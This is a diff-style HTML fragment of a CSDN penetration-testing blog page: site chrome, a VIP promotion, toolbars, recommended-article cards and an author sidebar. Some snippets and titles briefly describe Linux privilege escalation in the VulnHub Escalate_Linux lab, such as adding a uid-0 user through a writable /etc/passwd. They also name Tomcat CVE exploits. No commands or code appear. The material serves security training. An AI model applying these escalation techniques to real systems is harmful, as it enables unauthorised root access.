+      </div> 
+      <div class="vip-limited-time-offer-box-new" id="vip-limited-time-offer-box-new"> 
+       <img class="limited-img limited-img-new" src="https://csdnimg.cn/release/blogv2/dist/pc/img/vip-limited-close-newWhite.png"> 
+       <div class="vip-limited-time-top">
+         确定要放弃本次机会？ 
+       </div> 
+       <span class="vip-limited-time-text">福利倒计时</span> 
+       <div class="limited-time-box-new"> 
+        <span class="time-hour"></span> 
+        <i>:</i> 
+        <span class="time-minite"></span> 
+        <i>:</i> 
+        <span class="time-second"></span> 
+       </div> 
+       <div class="limited-time-vip-box"> 
+        <p> <img class="coupon-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/vip-limited-close-roup.png"> <span class="def">立减 ¥</span> <span class="active limited-num"></span> </p> 
+        <span class="">普通VIP年卡可用</span> 
+       </div> 
+       <a class="limited-time-btn-new" href="https://mall.csdn.net/vip" data-report-click="{&quot;spm&quot;:&quot;1001.2101.3001.9621&quot;}" data-report-query="spm=1001.2101.3001.9621">立即使用</a> 
+      </div> 
+     </div> 
+     <div class="more-toolbox-new more-toolbar" id="toolBarBox"> 
+      <div class="left-toolbox"> 
+       <div class="toolbox-left"> 
+        <div class="profile-box"> 
+         <a class="profile-href" target="_blank" href="https://blog.csdn.net/serendipity1130"><img class="profile-img" src="https://profile-avatar.csdnimg.cn/88a93312af8a47899c75a54b7ad55264_serendipity1130.jpg!1"> <span class="profile-name"> malloc_冲！ </span> </a> 
+        </div> 
+        <div class="profile-attend"> 
+         <a class="tool-attend tool-bt-button tool-bt-attend" href="javascript:;" data-report-view="{&quot;mod&quot;:&quot;1592215036_002&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4232&quot;,&quot;extend1&quot;:&quot;关注&quot;}">关注</a> 
+         <a class="tool-item-follow active-animation" style="display:none;">关注</a> 
+        </div> 
+       </div> 
+       <div class="toolbox-middle"> 
+        <ul class="toolbox-list"> 
+         <li class="tool-item tool-item-size tool-active is-like" id="is-like" data-type="bottom"> <a class="tool-item-href"> <img style="display:none;" id="is-like-imgactive-animation-like" class="animation-dom active-animation" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarThumbUpactive.png" alt=""> <img class="isactive" style="display:none" id="is-like-imgactive" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/like-active.png" alt=""> <img class="isdefault" style="display:block" id="is-like-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/like.png" alt=""> <span id="spanCount" class="count "> 8 </span> </a> 
+          <div class="tool-hover-tip">
+           <span class="text space">点赞</span>
+          </div> </li> 
+         <li class="tool-item tool-item-size tool-active is-unlike" id="is-unlike"> <a class="tool-item-href"> <img class="isactive" style="margin-right:0px;display:none" id="is-unlike-imgactive" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/unlike-active.png" alt=""> <img class="isdefault" style="margin-right:0px;display:block" id="is-unlike-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/unlike.png" alt=""> <span id="unlikeCount" class="count "></span> </a> 
+          <div class="tool-hover-tip">
+           <span class="text space">踩</span>
+          </div> </li> 
+         <li class="tool-item tool-item-size tool-active is-collection "> <a class="tool-item-href" href="javascript:;" data-report-click="{&quot;mod&quot;:&quot;popu_824&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4130&quot;,&quot;ab&quot;:&quot;new&quot;}"> <img style="display:none" id="is-collection-img-collection" class="animation-dom active-animation" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/collect-active.png" alt=""> <img class="isdefault" id="is-collection-img" style="display:block" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/collect.png" alt=""> <img class="isactive" id="is-collection-imgactive" style="display:none" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCollectActive.png" alt=""> <span class="count get-collection " data-num="36" id="get-collection"> 36 </span> </a> 
+          <div class="tool-hover-tip collect"> 
+           <div class="collect-operate-box"> 
+            <span class="collect-text" id="is-collection"> 收藏 </span> 
+           </div> 
+          </div> 
+          <div class="tool-active-list"> 
+           <div class="text">
+             觉得还不错? 
+            <span class="collect-text" id="tool-active-list-collection"> 一键收藏 </span> 
+            <img id="tool-active-list-close" src="https://csdnimg.cn/release/blogv2/dist/pc/img/collectionCloseWhite.png" alt=""> 
+           </div> 
+          </div> </li> 
+         <li class="tool-item tool-item-size tool-active tool-item-comment"> 
+          <div class="guide-rr-first"> 
+           <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/guideRedReward01.png" alt=""> 
+           <button class="btn-guide-known">知道了</button> 
+          </div> <a class="tool-item-href go-side-comment" data-report-click="{&quot;spm&quot;:&quot;1001.2101.3001.7009&quot;}"> <img class="isdefault" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/comment.png" alt=""> <span class="count"> 8 </span> </a> 
+          <div class="tool-hover-tip">
+           <span class="text space">评论</span>
+          </div> </li> 
+         <li class="tool-item tool-item-size tool-active tool-QRcode" data-type="article" id="tool-share"> <a class="tool-item-href" href="javascript:;" data-report-view="{&quot;spm&quot;:&quot;3001.4129&quot;,&quot;extra&quot;:{&quot;type&quot;:&quot;blogdetail&quot;}}"> <img class="isdefault" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/share.png" alt=""> <span class="count">分享</span> </a> 
+          <div class="QRcode active" id="tool-QRcode"> 
+           <div class="share-bg-box"> 
+            <div class="share-content"> 
+             <a id="copyPosterUrl" data-type="link" class="btn-share">复制链接</a> 
+            </div> 
+            <div class="share-content"> 
+             <a class="btn-share" data-type="qq">分享到 QQ</a> 
+            </div> 
+            <div class="share-content"> 
+             <a class="btn-share" data-type="weibo">分享到新浪微博</a> 
+            </div> 
+            <div class="share-code"> 
+             <div class="share-code-box" id="shareCode"></div> 
+             <div class="share-code-text"> 
+              <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/share/icon-wechat.png" alt="">扫一扫 
+             </div> 
+            </div> 
+           </div> 
+          </div> </li> 
+         <li class="tool-item tool-item-size tool-active is-more" id="is-more"> <a class="tool-item-href"> <img class="isdefault" style="margin-right:0px;display:block" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/more.png" alt=""> <span class="count"></span> </a> 
+          <div class="more-opt-box"> 
+           <div class="mini-box"> 
+            <a class="tool-item-href" id="toolReportBtnHide"> <img class="isdefault" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/report.png" alt=""> <span class="count">举报</span> </a> 
+           </div> 
+           <div class="normal-box"> 
+            <a class="tool-item-href" id="toolReportBtnHideNormal"> <img class="isdefault" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/report.png" alt=""> <span class="count">举报</span> </a> 
+           </div> 
+          </div> </li> 
+        </ul> 
+       </div> 
+       <div class="toolbox-right"> 
+        <div class="tool-directory"> 
+         <a class="bt-columnlist-show" data-id="11321741" data-free="true" data-description="" data-subscribe="false" data-title="渗透测试" data-img="https://i-blog.csdnimg.cn/columns/default/20201014180756754.png?x-oss-process=image/resize,m_fixed,h_224,w_224" data-url="https://blog.csdn.net/serendipity1130/category_11321741.html" data-sum="22" data-people="5" data-price="0" data-hotrank="0" data-status="true" data-oldprice="0" data-join="false" data-studyvip="true" data-studysubscribe="false" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.6334&quot;,&quot;extend1&quot;:&quot;专栏目录&quot;}" data-report-click="{&quot;spm&quot;:&quot;1001.2101.3001.6334&quot;,&quot;extend1&quot;:&quot;专栏目录&quot;}">专栏目录</a> 
+        </div> 
+       </div> 
+      </div> 
+     </div>   
+     <a id="commentBox" name="commentBox"></a> 
+     <div id="pcCommentBox" class="comment-box comment-box-new2 login-comment-box-new" style="display:none"> 
+      <div class="has-comment" style="display:block"> 
+       <div class="one-line-box"> 
+        <div class="has-comment-tit go-side-comment"> 
+         <span class="count">8</span>&nbsp;条评论 
+        </div> 
+        <div class="has-comment-con comment-operate-item"></div> 
+        <a class="has-comment-bt-right go-side-comment focus">写评论</a> 
+       </div> 
+      </div> 
+     </div> 
+     <div class="first-recommend-box recommend-box recommend-highlight-default"> 
+      <div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/2302_78903258/article/details/141129573" data-report-view="{&quot;ab&quot;:&quot;new&quot;,&quot;spm&quot;:&quot;1001.2101.3001.6661.1&quot;,&quot;mod&quot;:&quot;popu_871&quot;,&quot;extra&quot;:&quot;{\&quot;highlightScore\&quot;:0.0,\&quot;utm_medium\&quot;:\&quot;distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-141129573-blog-120009530.235^v43^pc_blog_bottom_relevance_base7\&quot;,\&quot;dist_request_id\&quot;:\&quot;1746804654445_54215\&quot;}&quot;,&quot;dist_request_id&quot;:&quot;1746804654445_54215&quot;,&quot;ab_strategy&quot;:&quot;vipdefault&quot;,&quot;index&quot;:&quot;1&quot;,&quot;strategy&quot;:&quot;2~default~BlogCommendFromBaidu~Rate&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/2302_78903258/article/details/141129573&quot;}"> 
+       <div class="content-box"> 
+        <div class="content-blog display-flex"> 
+         <div class="title-box"> 
+          <span class="type"> <img src="https://csdnimg.cn/release/blogv2/dist/components/img/blogType.png" alt=""> <span class="tip">博客</span> </span> 
+          <a href="https://blog.csdn.net/2302_78903258/article/details/141129573" class="tit" target="_blank" data-report-click="{&quot;ab&quot;:&quot;new&quot;,&quot;spm&quot;:&quot;1001.2101.3001.6661.1&quot;,&quot;mod&quot;:&quot;popu_871&quot;,&quot;extra&quot;:&quot;{\&quot;highlightScore\&quot;:0.0,\&quot;utm_medium\&quot;:\&quot;distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-141129573-blog-120009530.235^v43^pc_blog_bottom_relevance_base7\&quot;,\&quot;dist_request_id\&quot;:\&quot;1746804654445_54215\&quot;}&quot;,&quot;dist_request_id&quot;:&quot;1746804654445_54215&quot;,&quot;ab_strategy&quot;:&quot;vipdefault&quot;,&quot;index&quot;:&quot;1&quot;,&quot;strategy&quot;:&quot;2~default~BlogCommendFromBaidu~Rate&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/2302_78903258/article/details/141129573&quot;}" data-report-query="spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-141129573-blog-120009530.235%5Ev43%5Epc_blog_bottom_relevance_base7&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-141129573-blog-120009530.235%5Ev43%5Epc_blog_bottom_relevance_base7"> 
+           <div class="left ellipsis-online ellipsis-online-1">
+            <em>Linux</em>权限提升-
+            <em>Esc</em>
+            <em>alate</em>_
+            <em>Linux</em>
+           </div> </a> 
+         </div> 
+         <div class="info-box display-flex"> 
+          <div class="info"> 
+           <a href="https://blog.csdn.net/2302_78903258" target="_blank"><span class="blog-title">2302_78903258的博客</span></a> 
+          </div> 
+          <div class="info display-flex"> 
+           <span class="info-block time">08-12</span> 
+           <span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt=""> 1748 </span> 
+          </div> 
+         </div> 
+        </div> 
+        <div class="desc-box"> 
+         <a href="https://blog.csdn.net/2302_78903258/article/details/141129573" target="_blank" data-report-click="{&quot;ab&quot;:&quot;new&quot;,&quot;spm&quot;:&quot;1001.2101.3001.6661.1&quot;,&quot;mod&quot;:&quot;popu_871&quot;,&quot;extra&quot;:&quot;{\&quot;highlightScore\&quot;:0.0,\&quot;utm_medium\&quot;:\&quot;distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-141129573-blog-120009530.235^v43^pc_blog_bottom_relevance_base7\&quot;,\&quot;dist_request_id\&quot;:\&quot;1746804654445_54215\&quot;}&quot;,&quot;dist_request_id&quot;:&quot;1746804654445_54215&quot;,&quot;ab_strategy&quot;:&quot;vipdefault&quot;,&quot;index&quot;:&quot;1&quot;,&quot;strategy&quot;:&quot;2~default~BlogCommendFromBaidu~Rate&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/2302_78903258/article/details/141129573&quot;}" data-report-query="spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-141129573-blog-120009530.235%5Ev43%5Epc_blog_bottom_relevance_base7&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-141129573-blog-120009530.235%5Ev43%5Epc_blog_bottom_relevance_base7"> 
+          <div class="desc ellipsis-online ellipsis-online-1">
+           1.切换至user4，发现root的组里面有user4和user7，意思是user4和user7可以修改/etc/passwd文件,那么
+           <em>提权</em>的
+           <em>方式</em>跟方法五是一样的，直接添加uid为0的用户即可
+           <em>提权</em>。1.继续根据枚举的信息，确认user7是gid为0的组成员，使用和方法3相同的办法进入user7，切换至user7，发现user7属于gid为0的组。2）进入user5目录，执行发现和ls命令一样的结果，这是因为这个脚本是使用root权限执行ls命令，所以这里可以通过全局环境变量
+           <em>提权</em>。
+          </div> </a> 
+        </div> 
+       </div> 
+      </div> 
+     </div>  
+     <div class="second-recommend-box recommend-box recommend-highlight-default"> 
+      <div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/qq_53577336/article/details/122657302" data-report-view="{&quot;ab&quot;:&quot;new&quot;,&quot;spm&quot;:&quot;1001.2101.3001.6650.1&quot;,&quot;mod&quot;:&quot;popu_387&quot;,&quot;extra&quot;:&quot;{\&quot;highlightScore\&quot;:0.0,\&quot;utm_medium\&quot;:\&quot;distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-122657302-blog-120009530.235^v43^pc_blog_bottom_relevance_base7\&quot;,\&quot;dist_request_id\&quot;:\&quot;1746804654445_54215\&quot;}&quot;,&quot;dist_request_id&quot;:&quot;1746804654445_54215&quot;,&quot;ab_strategy&quot;:&quot;vipdefault&quot;,&quot;index&quot;:&quot;1&quot;,&quot;strategy&quot;:&quot;2~default~BlogCommendFromBaidu~Rate&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/qq_53577336/article/details/122657302&quot;}"> 
+       <div class="content-box"> 
+        <div class="content-blog display-flex"> 
+         <div class="title-box"> 
+          <span class="type"> <img src="https://csdnimg.cn/release/blogv2/dist/components/img/blogType.png" alt=""> <span class="tip">博客</span> </span> 
+          <a href="https://blog.csdn.net/qq_53577336/article/details/122657302" class="tit" target="_blank" data-report-click="{&quot;ab&quot;:&quot;new&quot;,&quot;spm&quot;:&quot;1001.2101.3001.6650.1&quot;,&quot;mod&quot;:&quot;popu_387&quot;,&quot;extra&quot;:&quot;{\&quot;highlightScore\&quot;:0.0,\&quot;utm_medium\&quot;:\&quot;distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-122657302-blog-120009530.235^v43^pc_blog_bottom_relevance_base7\&quot;,\&quot;dist_request_id\&quot;:\&quot;1746804654445_54215\&quot;}&quot;,&quot;dist_request_id&quot;:&quot;1746804654445_54215&quot;,&quot;ab_strategy&quot;:&quot;vipdefault&quot;,&quot;index&quot;:&quot;1&quot;,&quot;strategy&quot;:&quot;2~default~BlogCommendFromBaidu~Rate&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/qq_53577336/article/details/122657302&quot;}" data-report-query="spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-122657302-blog-120009530.235%5Ev43%5Epc_blog_bottom_relevance_base7&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-122657302-blog-120009530.235%5Ev43%5Epc_blog_bottom_relevance_base7"> 
+           <div class="left ellipsis-online ellipsis-online-1">
+            <em>Linux</em>
+            <em>提权</em>总结
+           </div> </a> 
+         </div> 
+         <div class="info-box display-flex"> 
+          <div class="info"> 
+           <a href="https://blog.csdn.net/qq_53577336" target="_blank"><span class="blog-title">告白的博客</span></a> 
+          </div> 
+          <div class="info display-flex"> 
+           <span class="info-block time">01-23</span> 
+           <span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt=""> 2384 </span> 
+          </div> 
+         </div> 
+        </div> 
+        <div class="desc-box"> 
+         <a href="https://blog.csdn.net/qq_53577336/article/details/122657302" target="_blank" data-report-click="{&quot;ab&quot;:&quot;new&quot;,&quot;spm&quot;:&quot;1001.2101.3001.6650.1&quot;,&quot;mod&quot;:&quot;popu_387&quot;,&quot;extra&quot;:&quot;{\&quot;highlightScore\&quot;:0.0,\&quot;utm_medium\&quot;:\&quot;distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-122657302-blog-120009530.235^v43^pc_blog_bottom_relevance_base7\&quot;,\&quot;dist_request_id\&quot;:\&quot;1746804654445_54215\&quot;}&quot;,&quot;dist_request_id&quot;:&quot;1746804654445_54215&quot;,&quot;ab_strategy&quot;:&quot;vipdefault&quot;,&quot;index&quot;:&quot;1&quot;,&quot;strategy&quot;:&quot;2~default~BlogCommendFromBaidu~Rate&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/qq_53577336/article/details/122657302&quot;}" data-report-query="spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-122657302-blog-120009530.235%5Ev43%5Epc_blog_bottom_relevance_base7&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-122657302-blog-120009530.235%5Ev43%5Epc_blog_bottom_relevance_base7"> 
+          <div class="desc ellipsis-online ellipsis-online-1">
+           <em>Linux</em>
+           <em>提权</em>总结 
+           <em>提权</em>概念 特权升级有两
+           <em>种</em>类型：水平和垂直。在水平升级中，您从一个用户转移到 另一个用户。在这
+           <em>种</em>情况下，两个用户都是通用的，而在垂直
+           <em>方式</em>中，我们将特权从普通用户提升为管理员。 用户无法访问（读取/写入/执行）不允许访问的文件。但是，超级用户 （root）可以访问系统上存在的所有文件。 为了更改任何重要的配置或进行进一步的攻击，首先，我们需要在任何基于
+           <em>Linux</em>的系统上获得root用户 访问权限 为什么我们需要执行特权升级？ 读/写任何敏感文件 重新启动之间轻松保持 插入永久后门 特
+          </div> </a> 
+        </div> 
+       </div> 
+      </div> 
+     </div> 
+     <div class="recommend-box insert-baidu-box  recommend-highlight-default"> 
+      <div class="recommend-item-box no-index" style="display:none"></div> 
+      <div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/2401_84140140/article/details/137557028" data-report-view="{&quot;ab&quot;:&quot;new&quot;,&quot;spm&quot;:&quot;1001.2101.3001.6650.2&quot;,&quot;mod&quot;:&quot;popu_387&quot;,&quot;extra&quot;:&quot;{\&quot;highlightScore\&quot;:0.0,\&quot;utm_medium\&quot;:\&quot;distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-2-137557028-blog-120009530.235^v43^pc_blog_bottom_relevance_base7\&quot;,\&quot;dist_request_id\&quot;:\&quot;1746804654445_54215\&quot;}&quot;,&quot;dist_request_id&quot;:&quot;1746804654445_54215&quot;,&quot;ab_strategy&quot;:&quot;vipdefault&quot;,&quot;index&quot;:&quot;2&quot;,&quot;strategy&quot;:&quot;2~default~BlogCommendFromBaidu~Rate&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/2401_84140140/article/details/137557028&quot;}"> 
+       <div class="content-box"> 
+        <div class="content-blog display-flex"> 
+         <div class="title-box"> 
+          <span class="type"> <img src="https://csdnimg.cn/release/blogv2/dist/components/img/blogType.png" alt=""> <span class="tip">博客</span> </span> 
+          <a href="https://blog.csdn.net/2401_84140140/article/details/137557028" class="tit" target="_blank" data-report-click="{&quot;ab&quot;:&quot;new&quot;,&quot;spm&quot;:&quot;1001.2101.3001.6650.2&quot;,&quot;mod&quot;:&quot;popu_387&quot;,&quot;extra&quot;:&quot;{\&quot;highlightScore\&quot;:0.0,\&quot;utm_medium\&quot;:\&quot;distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-2-137557028-blog-120009530.235^v43^pc_blog_bottom_relevance_base7\&quot;,\&quot;dist_request_id\&quot;:\&quot;1746804654445_54215\&quot;}&quot;,&quot;dist_request_id&quot;:&quot;1746804654445_54215&quot;,&quot;ab_strategy&quot;:&quot;vipdefault&quot;,&quot;index&quot;:&quot;2&quot;,&quot;strategy&quot;:&quot;2~default~BlogCommendFromBaidu~Rate&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/2401_84140140/article/details/137557028&quot;}" data-report-query="spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-2-137557028-blog-120009530.235%5Ev43%5Epc_blog_bottom_relevance_base7&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-2-137557028-blog-120009530.235%5Ev43%5Epc_blog_bottom_relevance_base7"> 
+           <div class="left ellipsis-online ellipsis-online-1">
+            记录一次VulnHub 靶场——
+            <em>Esc</em>
+            <em>alate</em>_
+            <em>Linux</em>的
+            <em>渗透</em>测试过程(3)
+           </div> 
+           <div class="tag">
+            最新发布
+           </div> </a> 
+         </div> 
+         <div class="info-box display-flex"> 
+          <div class="info"> 
+           <a href="https://blog.csdn.net/2401_84140140" target="_blank"><span class="blog-title">2401_84140140的博客</span></a> 
+          </div> 
+          <div class="info display-flex"> 
+           <span class="info-block time">04-09</span> 
+           <span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt=""> 769 </span> 
+          </div> 
+         </div> 
+        </div> 
+        <div class="desc-box"> 
+         <a href="https://blog.csdn.net/2401_84140140/article/details/137557028" target="_blank" data-report-click="{&quot;ab&quot;:&quot;new&quot;,&quot;spm&quot;:&quot;1001.2101.3001.6650.2&quot;,&quot;mod&quot;:&quot;popu_387&quot;,&quot;extra&quot;:&quot;{\&quot;highlightScore\&quot;:0.0,\&quot;utm_medium\&quot;:\&quot;distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-2-137557028-blog-120009530.235^v43^pc_blog_bottom_relevance_base7\&quot;,\&quot;dist_request_id\&quot;:\&quot;1746804654445_54215\&quot;}&quot;,&quot;dist_request_id&quot;:&quot;1746804654445_54215&quot;,&quot;ab_strategy&quot;:&quot;vipdefault&quot;,&quot;index&quot;:&quot;2&quot;,&quot;strategy&quot;:&quot;2~default~BlogCommendFromBaidu~Rate&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/2401_84140140/article/details/137557028&quot;}" data-report-query="spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-2-137557028-blog-120009530.235%5Ev43%5Epc_blog_bottom_relevance_base7&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-2-137557028-blog-120009530.235%5Ev43%5Epc_blog_bottom_relevance_base7"> 
+          <div class="desc ellipsis-online ellipsis-online-1">
+           在结束之际，我想重申的是，学习并非如攀登险峻高峰，而是如滴水穿石般的持久累积。尤其当我们步入工作岗位之后，持之以恒的学习变得愈发不易，如同在茫茫大海中独自划舟，稍有松懈便可能被巨浪吞噬。然而，对于我们程序员而言，学习是生存之本，是我们在激烈市场竞争中立于不败之地的关键。一旦停止学习，我们便如同逆水行舟，不进则退，终将被时代的洪流所淘汰。因此，不断汲取新知识，不仅是对自己的提升，更是对自己的一份珍贵投资。让我们不断磨砺自己，与时代共同进步，书写属于我们的辉煌篇章。需要完整版PDF学习资源私我。
+          </div> </a> 
+        </div> 
+       </div> 
+      </div> 
+     </div> 
+     <div class="blog-footer-bottom" style="margin-top:10px;"></div>   
+    </main> 
+    <aside class="blog_container_aside"> 
+     <div id="asideProfile" class="aside-box active"> 
+      <div class="profile-intro d-flex"> 
+       <div class="avatar-box d-flex justify-content-center flex-column"> 
+        <a href="https://blog.csdn.net/serendipity1130" target="_blank" data-report-click="{&quot;mod&quot;:&quot;popu_379&quot;,&quot;spm&quot;:&quot;3001.4121&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130&quot;,&quot;ab&quot;:&quot;new&quot;}"> <img src="https://profile-avatar.csdnimg.cn/88a93312af8a47899c75a54b7ad55264_serendipity1130.jpg!1" class="avatar_pic"> </a> 
+       </div> 
+       <div class="user-info d-flex flex-column profile-intro-name-box"> 
+        <div class="profile-intro-name-boxTop"> 
+         <a href="https://blog.csdn.net/serendipity1130" target="_blank" class="" id="uid" title="malloc_冲！" data-report-click="{&quot;mod&quot;:&quot;popu_379&quot;,&quot;spm&quot;:&quot;3001.4122&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130&quot;,&quot;ab&quot;:&quot;new&quot;}"> <span class="name" username="serendipity1130">malloc_冲！</span> </a> 
+        </div> 
+        <div class="profile-intro-name-boxFooter-new"> 
+         <p class="profile-intro-name-leve"> <span> 博客等级 </span> <img class="level" src="https://csdnimg.cn/identity/blog4.png"> </p> 
+         <span class="profile-intro-name-years" title="已加入 CSDN 4年">码龄4年</span> 
+        </div> 
+       </div> 
+      </div> 
+      <div class="profile-intro-rank-information"> 
+       <dl> 
+        <a href="https://blog.csdn.net/serendipity1130" data-report-click="{&quot;mod&quot;:&quot;1598321000_001&quot;,&quot;spm&quot;:&quot;3001.4310&quot;}" data-report-query="t=1"> 
+         <dd>
+          <span>80</span>
+         </dd> 
+         <dt>
+          原创
+         </dt> </a> 
+       </dl> 
+       <dl title="105"> 
+        <dd>
+         105
+        </dd> 
+        <dt>
+         点赞
+        </dt> 
+       </dl> 
+       <dl title="390"> 
+        <dd>
+         390
+        </dd> 
+        <dt>
+         收藏
+        </dt> 
+       </dl> 
+       <dl id="fanBox" title="87"> 
+        <dd>
+         <span id="fan">87</span>
+        </dd> 
+        <dt>
+         粉丝
+        </dt> 
+       </dl> 
+      </div> 
+      <div class="profile-intro-name-boxOpration"> 
+       <div class="opt-letter-watch-box"> 
+        <a class="personal-watch bt-button" id="btnAttent">关注</a> 
+       </div> 
+       <div class="opt-letter-watch-box"> 
+        <a rel="noopener" class="bt-button personal-letter" href="https://im.csdn.net/chat/serendipity1130" target="_blank">私信</a> 
+       </div> 
+      </div> 
+     </div> 
+     <div id="asideHotArticle" class="aside-box"> 
+      <h3 class="aside-title">热门文章</h3> 
+      <div class="aside-content"> 
+       <ul class="hotArticle-list"> 
+        <li> <a href="https://blog.csdn.net/serendipity1130/article/details/120029698" target="_blank" data-report-click="{&quot;mod&quot;:&quot;popu_541&quot;,&quot;spm&quot;:&quot;3001.4139&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/article/details/120029698&quot;,&quot;ab&quot;:&quot;new&quot;}"> 【Tomcat漏洞复现】CVE-2020-1938文件包含漏洞+Tomcat8+弱口令&amp;&amp;后台getshell漏洞+CVE_2017_12615远程代码执行漏洞 <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt=""> <span class="read">18186</span> </a> </li> 
+        <li> <a href="https://blog.csdn.net/serendipity1130/article/details/120154534" target="_blank" data-report-click="{&quot;mod&quot;:&quot;popu_541&quot;,&quot;spm&quot;:&quot;3001.4139&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/article/details/120154534&quot;,&quot;ab&quot;:&quot;new&quot;}"> 【密码学RSA】共模攻击原理详解_已知e1*e2的共模攻击题 <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt=""> <span class="read">13664</span> </a> </li> 
+        <li> <a href="https://blog.csdn.net/serendipity1130/article/details/122615533" target="_blank" data-report-click="{&quot;mod&quot;:&quot;popu_541&quot;,&quot;spm&quot;:&quot;3001.4139&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/article/details/122615533&quot;,&quot;ab&quot;:&quot;new&quot;}"> 【交换机】华为及H3C交换机配置vlan及故障处理 <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt=""> <span class="read">7446</span> </a> </li> 
+        <li> <a href="https://blog.csdn.net/serendipity1130/article/details/120003711" target="_blank" data-report-click="{&quot;mod&quot;:&quot;popu_541&quot;,&quot;spm&quot;:&quot;3001.4139&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/article/details/120003711&quot;,&quot;ab&quot;:&quot;new&quot;}"> 【DC系列】DC-6靶机渗透测试_csrf漏洞+nmap提权 <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt=""> <span class="read">6084</span> </a> </li> 
+        <li> <a href="https://blog.csdn.net/serendipity1130/article/details/120009530" target="_blank" data-report-click="{&quot;mod&quot;:&quot;popu_541&quot;,&quot;spm&quot;:&quot;3001.4139&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/serendipity1130/article/details/120009530&quot;,&quot;ab&quot;:&quot;new&quot;}"> 【靶机渗透】Escalate_Linux靶机渗透练习+12种提权方式 <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt=""> <span class="read">5219</span> </a> </li> 
+       </ul> 
+      </div> 
+     </div> 
+     <div id="asideCategory" class="aside-box flexible-box"> 
+      <h3 class="aside-title">分类专栏</h3> 
+      <div class="aside-content" id="aside-content"> 
+       <ul> 
